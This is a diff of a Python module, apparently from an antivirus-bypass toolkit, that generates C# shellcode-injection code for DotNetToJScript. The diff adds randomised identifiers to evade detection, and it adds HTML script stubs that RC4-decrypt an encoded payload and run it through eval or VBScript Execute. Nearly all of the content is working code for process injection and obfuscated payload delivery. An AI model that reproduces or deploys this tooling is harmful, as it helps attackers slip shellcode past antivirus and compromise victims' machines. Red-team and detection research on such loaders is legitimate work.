@@ -1,36 +1,36 @@
 """
     Generators various code snippets, primarily used for DotNetToJScript.
 """
-# from lib.common import helpers
-# from Tools.Bypass.bypass_common import bypass_helpers
+from Tools.Bypass.bypass_common import bypass_helpers  # pylint: disable=E0611,E0401
 import os
 
-def genCSharpShellCodeMigration():
+def genCSharpShellCodeMigration(process, gamemaker_code):
     
     code = ""
     num_tabs = 0
 
-    className = "TestClass"
-    processMigrate = "Migrate"
-    processMigratex86 = "x86"
-    processMigratex64 = "x64"
-    processMigrateProcessPath = "processpath"
-    processMigrateShellcode = "s"
-    shellCode = "shellcode"
-    startupInfo = "startupinfo"
-    processInformation = "processInformation"
-    success = "success"
-    resultPtr = "resultPtr"
-    bytesWritten = "bytesWritten"
-    resultBool = "resultBool"
-    oldProtect = "oldProtect"
-    targetProc = "targetProc"
-    currentThreads = "currentThreads"
-    sht = "sht"
-    ptr = "ptr"
-    ThreadHandle = "ThreadHandle"
+    bytearrayName = bypass_helpers.randomString()
+    className = "HelloWorld"
+    processMigrate = "Print"
+    processMigratex86 = bypass_helpers.randomString()
+    processMigratex64 = bypass_helpers.randomString()
+    processMigrateProcessPath = bypass_helpers.randomString()
+    processMigrateShellcode = bypass_helpers.randomString()
+    shellCode = bypass_helpers.randomString()
+    startupInfo = bypass_helpers.randomString()
+    processInformation = bypass_helpers.randomString()
+    success = bypass_helpers.randomString()
+    resultPtr = bypass_helpers.randomString()
+    bytesWritten = bypass_helpers.randomString()
+    resultBool = bypass_helpers.randomString()
+    oldProtect = bypass_helpers.randomString()
+    targetProc = bypass_helpers.randomString()
+    currentThreads = bypass_helpers.randomString()
+    sht = bypass_helpers.randomString()
+    ptr = bypass_helpers.randomString()
+    ThreadHandle = bypass_helpers.randomString()
 
-    code += "using System; using System.Diagnostics; using System.Reflection; using System.Runtime.InteropServices;\n\n"
+    code += "using System;\nusing System.Diagnostics;\nusing System.Reflection;\nusing System.Runtime.InteropServices;\nusing System.Linq;\n\n"
     code += "[ComVisible(true)]\n"
     code += "public class {0}\n".format(className)
     code += "{\n"
@@ -40,18 +40,29 @@ def genCSharpShellCodeMigration():
     code += "\t" * num_tabs + "public {0}()\n".format(className)
     code += "\t" * num_tabs + "{\n\n"
     code += "\t" * num_tabs + "}\n\n"
-    code += "\t" * num_tabs + "public void {0}(string {1}, string {2}, string {3})\n".format(processMigrate, processMigratex86, processMigratex64, processMigrateProcessPath)
+    code += "\t" * num_tabs + "public void {0}(string {1},string {2})\n".format(processMigrate, processMigratex86, processMigratex64)
     code += "\t" * num_tabs + "{\n"
-    code += "\t" * num_tabs + "\tstring {0};\n\n".format(processMigrateShellcode)
+    code += "\t" * num_tabs + gamemaker_code
+    code += "\t" * num_tabs + "string {0};\n".format(processMigrateShellcode)
+    code += "\t" * num_tabs + "string {0};\n".format(processMigrateProcessPath)
     code += "\t" * num_tabs + "\tif(IntPtr.Size == 4)\n"
     code += "\t" * num_tabs + "\t{\n"
     code += "\t" * num_tabs + "\t\t{0} = {1};\n".format(processMigrateShellcode, processMigratex86)
+    code += "\t" * num_tabs + "\t\t{0} = \"{1}\";\n\n".format(processMigrateProcessPath, "C:\\\\Windows\\\\System32\\\\" + process)
     code += "\t" * num_tabs + "\t}\n"
     code += "\t" * num_tabs + "\telse\n"
     code += "\t" * num_tabs + "\t{\n"
     code += "\t" * num_tabs + "\t\t{0} = {1};\n".format(processMigrateShellcode, processMigratex64)
+    code += "\t" * num_tabs + "\t\t{0} = \"{1}\";\n\n".format(processMigrateProcessPath, "C:\\\\Windows\\\\SysWOW64\\\\" + process)
     code += "\t" * num_tabs + "\t}\n\n"
-    code += "\t" * num_tabs + "\tbyte[] {0} = Convert.FromBase64String({1});\n".format(shellCode, processMigrateShellcode)
+    code += '\t' * num_tabs + "\tstring %s = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(%s));\n" % (bytearrayName, processMigrateShellcode)
+    code += '\t' * num_tabs + "\tstring[] chars = %s.Split(',').ToArray();\n" %(bytearrayName)
+    code += '\t' * num_tabs + "\tbyte[] %s = new byte[chars.Length];\n" %(shellCode)
+    code += '\t' * num_tabs + \
+	            "\tfor (int i = 0; i < chars.Length; ++i) { %s[i] = Convert.ToByte(chars[i], 16); }\n" % (
+	                shellCode)
+
+    # code += "\t" * num_tabs + "\tbyte[] {0} = Convert.FromBase64String({1});\n".format(shellCode, processMigrateShellcode)
     code += "\t" * num_tabs + "\tSTARTUPINFO {0} = new STARTUPINFO();\n".format(startupInfo)
     code += "\t" * num_tabs + "\tPROCESS_INFORMATION {0} = new PROCESS_INFORMATION();\n".format(processInformation)
     code += "\t" * num_tabs + "\tbool {0} = CreateProcess({1}, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW , IntPtr.Zero, null, ref {2}, out {3});\n".format(success, processMigrateProcessPath, startupInfo, processInformation)
@@ -143,7 +154,7 @@ def genCSharpShellCodeMigration():
 		}
 		
 		[Flags]
-		public enum    ThreadAccess : int
+		public enum ThreadAccess : int
 		{
 			TERMINATE           = (0x0001)  ,
 			SUSPEND_RESUME      = (0x0002)  ,
@@ -195,11 +206,101 @@ def genCSharpShellCodeMigration():
 
     return code
 
-def assemblyToJScript(code):
-    with open("/tmp/dotnettojscript.cs", "w") as f:
-        f.write(code)
+def genRC4JScript(payload, key):
+	# TODO: obfuscate
+	code = "<script language = \"javascript\">"
 
-    os.system("mcs -platform:x86 -target:library /tmp/dotnettojscript.cs -out:/tmp/dotnettojscript.dll")
-    os.system("WINEPREFIX=/root/.greatsct wine /usr/share/greatsct/DotNetToJScript.exe /tmp/dotnettojscript.dll > /opt/GreatSCT/testaroo.js")
-    
-assemblyToJScript(genCSharpShellCodeMigration())
+	code += """rc4 = function(key, str) {
+	var s = [], j = 0, x, res = '';
+	for (var i = 0; i < 256; i++) {
+		s[i] = i;
+	}
+	for (i = 0; i < 256; i++) {
+		j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
+		x = s[i];
+		s[i] = s[j];
+		s[j] = x;
+	}
+	i = 0;
+	j = 0;
+	for (var y = 0; y < str.length; y++) {
+		i = (i + 1) % 256;
+		j = (j + s[i]) % 256;
+		x = s[i];
+		s[i] = s[j];
+		s[j] = x;
+		res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
+	}
+	return res;
+}
+
+decodeBase64 = function(s) {
+    var e={},i,b=0,c,x,l=0,a,r='',w=String.fromCharCode,L=s.length;
+    var A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    for(i=0;i<64;i++){e[A.charAt(i)]=i;}
+    for(x=0;x<L;x++){
+        c=e[s.charAt(x)];b=(b<<6)+c;l+=6;
+        while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(r+=w(a));}
+    }
+    return r;
+};"""
+
+	code += '\nvar b64block = "{0}";'.format(payload)
+	code += "\nvar decoded = decodeBase64(b64block);"
+	code += "\nvar plain = rc4(\"{0}\", decoded);".format(key)
+	code += "\neval(plain);"
+	code += "\n</script>"
+
+	return code
+
+
+def genRC4VBScript(payload, key):
+
+	# TODO: obfuscate
+	code = "<script language = \"javascript\">"
+
+	code += """rc4 = function(key, str) {
+	var s = [], j = 0, x, res = '';
+	for (var i = 0; i < 256; i++) {
+		s[i] = i;
+	}
+	for (i = 0; i < 256; i++) {
+		j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
+		x = s[i];
+		s[i] = s[j];
+		s[j] = x;
+	}
+	i = 0;
+	j = 0;
+	for (var y = 0; y < str.length; y++) {
+		i = (i + 1) % 256;
+		j = (j + s[i]) % 256;
+		x = s[i];
+		s[i] = s[j];
+		s[j] = x;
+		res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
+	}
+	return res;
+}
+
+decodeBase64 = function(s) {
+    var e={},i,b=0,c,x,l=0,a,r='',w=String.fromCharCode,L=s.length;
+    var A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    for(i=0;i<64;i++){e[A.charAt(i)]=i;}
+    for(x=0;x<L;x++){
+        c=e[s.charAt(x)];b=(b<<6)+c;l+=6;
+        while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(r+=w(a));}
+    }
+    return r;
+};"""
+
+	code += '\nvar b64block = "{0}";'.format(payload)
+	code += "\nvar decoded = decodeBase64(b64block);"
+	code += "\nvar plain = rc4(\"{0}\", decoded);".format(key)
+	code += "\n</script>"
+	code += "\n<script language = \"vbscript\">"
+	code += "\nExecute plain"
+	code += "\nself.close"
+	code += "</script>"
+
+	return code
